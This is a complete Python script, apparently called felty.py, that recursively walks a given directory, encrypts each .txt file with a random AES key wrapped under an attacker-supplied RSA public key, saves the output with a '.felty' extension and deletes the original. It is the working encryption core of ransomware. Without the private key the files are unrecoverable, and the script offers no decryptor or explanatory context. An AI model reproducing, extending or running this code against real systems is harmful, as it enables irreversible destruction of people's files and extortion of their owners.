#!/usr/bin/env python3
import sys
import os
from pathlib import Path
from cryptography.hazmat.primitives import hashes, padding as sym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import secrets

EXT = ".felty"

EXTS = [
    ".txt",
]


def is_target(path: Path):
    if not path.is_file():
        return False
    if path.suffix.lower() in EXTS:
        return True
    return False


def encrypt_file(path: Path, pubkey):
    data = path.read_bytes()
    aes_key = secrets.token_bytes(32)
    iv = secrets.token_bytes(16)
    padder = sym_padding.PKCS7(128).padder()
    pt = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    enc = encryptor.update(pt) + encryptor.finalize()
    ek = pubkey.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    out = len(ek).to_bytes(4, "big") + ek + iv + enc
    outp = path.with_suffix(path.suffix + EXT)
    outp.write_bytes(out)
    path.unlink()


def walk_and_encrypt(root: Path, pubkey):
    for p in root.rglob("*"):
        try:
            if is_target(p):
                print("Encrypt:", p)
                encrypt_file(p, pubkey)
        except Exception as e:
            print("ERR", p, e)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: felty.py <pubkey.pem> <directory>")
        sys.exit(1)
    pubpath = Path(sys.argv[1])
    d = Path(sys.argv[2])
    if not pubpath.exists():
        print("Public key not found:", pubpath)
        sys.exit(1)
    if not d.exists():
        print("Directory not found:", d)
        sys.exit(1)
    pub_pem = pubpath.read_bytes()
    pubkey = serialization.load_pem_public_key(pub_pem, backend=default_backend())
    walk_and_encrypt(d, pubkey)
